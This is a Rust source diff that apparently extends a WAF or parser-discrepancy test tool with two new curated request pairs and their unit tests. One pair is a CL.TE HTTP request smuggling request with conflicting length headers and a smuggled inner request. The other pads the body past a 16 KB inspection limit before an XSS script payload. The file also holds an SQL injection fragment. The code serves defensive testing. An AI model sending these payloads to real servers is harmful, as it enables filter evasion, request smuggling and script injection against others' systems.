@@ -9,6 +9,7 @@ use std::collections::HashMap;
 const MULTIPART_BOUNDARY: &str = "real-boundary";
 const XSS_PAYLOAD: &str = "<script>alert(1)</script>";
 const XML_SQLI_PAYLOAD: &str = "' UNION SELECT NULL--";
+const INSPECTION_BYPASS_BENIGN_PREFIX_SIZE: usize = 16 * 1024;
 
 #[derive(Debug, Clone, PartialEq, Eq)]
 pub struct CuratedRequest {
@@ -48,6 +49,8 @@ pub fn curated_parser_discrepancy_pairs(max_pairs: usize) -> Vec<CuratedDiscrepa
         xml_extra_field_addition(),
         xml_cdata_wrapper(),
         xml_doctype_preamble(),
+        clte_request_smuggling(),
+        payload_after_inspection_limit(),
     ];
 
     let max_pairs = max_pairs.min(all_pairs.len());
@@ -341,9 +344,93 @@ fn xml_doctype_preamble() -> CuratedDiscrepancyPair {
     )
 }
 
+fn clte_request_smuggling() -> CuratedDiscrepancyPair {
+    CuratedDiscrepancyPair {
+        name: "CL.TE Request Smuggling".to_string(),
+        canonical_class: "clte_smuggling".to_string(),
+        content_type: "application/x-www-form-urlencoded".to_string(),
+        payload_family: "protocol-smuggling".to_string(),
+        mutation_cost: 3,
+        control_request: CuratedRequest {
+            method: "POST".to_string(),
+            headers: HashMap::from([(
+                "Transfer-Encoding".to_string(),
+                "chunked".to_string(),
+            )]),
+            body: "4\r\ntest\r\n0\r\n\r\n".to_string(),
+        },
+        variant_request: CuratedRequest {
+            method: "POST".to_string(),
+            headers: HashMap::from([
+                ("Content-Length".to_string(), "4".to_string()),
+                ("Transfer-Encoding".to_string(), "chunked".to_string()),
+            ]),
+            body: "4\r\ntest\r\n5c\r\nGPOST / HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 15\r\n\r\nx=1\r\n0\r\n\r\n".to_string(),
+        },
+    }
+}
+
+fn payload_after_inspection_limit() -> CuratedDiscrepancyPair {
+    let benign_prefix = "x=".to_string() + &"A".repeat(INSPECTION_BYPASS_BENIGN_PREFIX_SIZE);
+    CuratedDiscrepancyPair {
+        name: "Payload After Inspection Limit".to_string(),
+        canonical_class: "inspection_limit_bypass".to_string(),
+        content_type: "application/x-www-form-urlencoded".to_string(),
+        payload_family: "body-size-bypass".to_string(),
+        mutation_cost: 2,
+        control_request: CuratedRequest {
+            method: "POST".to_string(),
+            headers: HashMap::from([(
+                "Content-Type".to_string(),
+                "application/x-www-form-urlencoded".to_string(),
+            )]),
+            body: format!("field1={XSS_PAYLOAD}"),
+        },
+        variant_request: CuratedRequest {
+            method: "POST".to_string(),
+            headers: HashMap::from([(
+                "Content-Type".to_string(),
+                "application/x-www-form-urlencoded".to_string(),
+            )]),
+            body: format!("{benign_prefix}&field1={XSS_PAYLOAD}"),
+        },
+    }
+}
+
 #[cfg(test)]
 mod tests {
     use super::*;
+
+    #[test]
+    fn test_curated_pairs_full_count() {
+        let pairs = curated_parser_discrepancy_pairs(20);
+        assert_eq!(pairs.len(), 20);
+    }
+
+    #[test]
+    fn test_clte_pair_has_conflicting_headers() {
+        let pairs = curated_parser_discrepancy_pairs(20);
+        let clte = pairs
+            .iter()
+            .find(|p| p.canonical_class == "clte_smuggling")
+            .expect("CL.TE pair not found");
+        assert!(clte.variant_request.headers.contains_key("Content-Length"));
+        assert!(clte
+            .variant_request
+            .headers
+            .contains_key("Transfer-Encoding"));
+    }
+
+    #[test]
+    fn test_inspection_limit_variant_is_large() {
+        let pairs = curated_parser_discrepancy_pairs(20);
+        let pair = pairs
+            .iter()
+            .find(|p| p.canonical_class == "inspection_limit_bypass")
+            .expect("inspection limit pair not found");
+        assert!(pair.variant_request.body.len() >= INSPECTION_BYPASS_BENIGN_PREFIX_SIZE);
+        assert!(pair.variant_request.body.contains(XSS_PAYLOAD));
+    }
 
     #[test]
     fn test_curated_pairs_default_distribution() {
